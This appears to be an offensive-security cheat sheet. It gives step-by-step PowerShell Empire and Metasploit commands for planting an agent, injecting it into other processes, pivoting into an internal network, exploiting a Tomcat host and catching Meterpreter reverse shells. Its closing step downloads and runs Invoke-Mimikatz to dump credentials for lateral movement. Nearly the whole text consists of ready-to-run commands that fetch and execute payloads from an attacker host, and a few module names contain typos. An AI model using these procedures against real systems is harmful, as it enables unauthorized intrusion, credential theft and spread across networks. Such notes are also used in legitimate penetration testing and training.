# PowerShell Empire 

1. load server with `sudo powershell-empire server`
2. load client with `sudo powershell-empire client`
3. get Empire agent on target machine:
	- get a shell on target machine 
	- run `listeners` to check current listeners running in Empire
	- run `uselistener <listener>` to select a listener to configure
	- run `info` to see information about this listener and `options` to see the options you need to configure 
	- configure options (i.e. `set Host <kali_ip>`, etc.)
	- run `execute` to start listener 
	- run `main` to go back to main menu an run `usestager` to view available stagers to use 
	- run `usestager <stager>` to select a stager  to use 
	- run `options` to see what needs to be configured and configure (i.e. `set Listener <listener>`)
	- run `execute` to generate command to run on compromised target system to download and execute the agent 
	- run this command returned on the target and wait for agent to be generated 
	- run `agents` to list available agents and use `interact <agent_name>` to interact with the newly created agent 


### Situational awareness 

First you want to gain an understanding of the internal environment this target is connected to, common modules to do this include:
1. arpscan:
	- `usemodule powershell/situational_awareness/network/arpscan`
	- `options` -> `set CIDR <internal_subnet>` 
	- `execute`
2. portscan:
	- `usemodule powershell/situational_awareness/network/portscan`
	- `options` -> `set Hosts <internal_target>`
	- `execute`


### Stabilizing connection 

Once you have an agent on the machine you can use Empire's "psinject" module to inject the agent into another process in order to maintain a stable process if the existing one is closed/unstable:
1. interact with the current agent on the machine with `interact <agent_name>`
2. run `shell ps` to get a list of processes running on the machine and choose one to inject into 
3. run `usemodule powershell/management/psinject`
4. configure options: `options` -> `set Listener http` -> `set ProcId <PID>`
5. run `execute`, wait for task to run, and interact with the new/stable agent with `agents` -> `interact <agent_name>`


### Pivot to attack internal targets

Next, you want to use the compromised host as a pivot point to attack internal targets. This can be done by transferring the existing Empire agent over to Metasploit through the "invoke_metasploitpayload" module.
1. prepare the "web_delivery" module inside Metasploit: 
	- `use exploit/multi/script/web_delivery`
	- `set target 2` (PowerShell payload) -> `set SRVHOST <kali_ip>` -> `set payload windows/metepreter/reverse_tcp` -> `set LHOST <kali_ip>`
	- `exploit -j` -> copy PowerShell payload URL generated
2. connect to Metasploit payload through Empire:
	- `usemodule/powershell/code_execution/invoke_metasploitpayload`
	- `options` -> `set URL <metasploit_url>`
	- `execute` and view Meterpreter session back in Metasploit console by running `sessions`
3. setup pivot in Metasploit:
	- `use post/multi/manage/autoroute`
	- `set SESSION <session_id>`
	- `run`
4. setup socks server in Metasploit:
	- `use auxiliary/server/socks_proxy`
	- `options` -> `set VERSION 4a` -> `set SRVHOST <kali_ip>`
	- `run`
5. run tools against internal targets:
	- a) enumerate through web browser: 
		- set proxy settings to be SOCKS with host `<kali_ip>`, version SOCKS v4, and port 1080
		- then navigate to that internal IP and web port (i.e. `http://10.100.11.100:8443`)
	- b) through proxychains:
		- configure `/etc/proxychains4.conf` to include `socks4 <kali_ip> 1080` under the `[ProxyList]` section
		- run `proxychains <cmd> <internal_ip>` to execute commands/tools against internal target 


### Connecting back to attacker from internal machine 

Before exploiting vulnerable targets through Metasploit you need to configure the "portproxy" module so that the payload can connect back from the internal machine to your attacker IP address by proxying the connection from the compromised target machine. 
1. load "portproxy" in Metasploit:
	- `use post/windows/manage/portproxy`
	- `options` -> `set CONNECT_ADDRESS <kali_ip>` -> `set CONNECT_PORT <kali_port>` -> `set LOCAL_ADDRESS <internal_iface_of_compromised_target>` -> `set LOCAL_PORT <port_on_compromised_target>` -> `set SESSION <compromised_target_session>`
	- `run`
	- this creates the necessary Windows firewall rules to proxy the connection back to your Kali machine 
2. load the Metasploit exploit module to attack the internal target machine
	- i.e. `use exploit/multi/http/tomcat_jsp_upload_bypass`
	- i.e. `set RHOST <internal_ip>` -> `set RPORT 8443` -> `set LHOST <external_iface_on_compromised_target>` -> `set payload java/jsp_shell_reverse_tcp` -> `run`
3. get a Metepreter shell (or other tools) onto compromised internal target
	- generate a Meterpreter payload (i.e. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.100.11.101 LPORT=4444 -f exe > /tmp/payload.exe`)
	- setup Python server on Kali machine (i.e. `cd /tmp && python -m SimpleHTTPServer 8000`)
	- setup a new "portproxy" to serve the payload to the compromised internal machine (i.e. `use post/windows/manage/portproxy` -> `set CONNECT_ADDRESS <kali_ip>` -> `set CONNECT_PORT 8000` -> `set LOCAL_ADDRESS <internal_iface_of_compromised_target>` -> `set LOCAL_PORT 8000` -> `set SESSION <compromised_target_session>` -> `run`)
	- now you have two port proxy rules in the Port Forwarding Table on the compromised machine (ports 4444 and 8000)
	- next, kill all jobs that might interfere with `jobs -K`
4. setup a listener and download + execute Meterpreter payload on internal target:
	- setup listener with `use exploit/multi/hanlder` -> `set payload windows/meterpreter/reverse_tcp` -> `set LHOST <kali_ip>` -> `set LPORT 4444` -> `exploit -j`
	- download onto internal target with `powershell -c iex (New-Object Net.WebClient).DownloadFile('http://<internal_iface_of_compromised_target>:8000/payload.exe', 'C:\Windows\Temp\payload.exe')`
	- execute on internal target with `\windows\temp\payload.exe`
	- then catch then shell in Metasploit and interact with it 


### Post internal machine compromise

Once you've gained access to a machine you can try to dump local credentials (if you have admin/system access) using PowerShell-based Mimikatz:
1. obtain system shell on target machine 
2. download [Invoke-Mimikatz](https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1) onto Kali machine 
	- `cd /tmp && wget https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1`
3. through the previously setup Metasploit "portproxy" on port 8000, download and execute on internal target machine 
	- setup Python server with `python3 -m http.server 8000`
	- download and execute with `powershell -c iex (New-Object Net.WebClient).DownloadString('http://<internal_iface_of_compromised_target>:8000/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds`
4. used hashes to jump to other machines in internal network 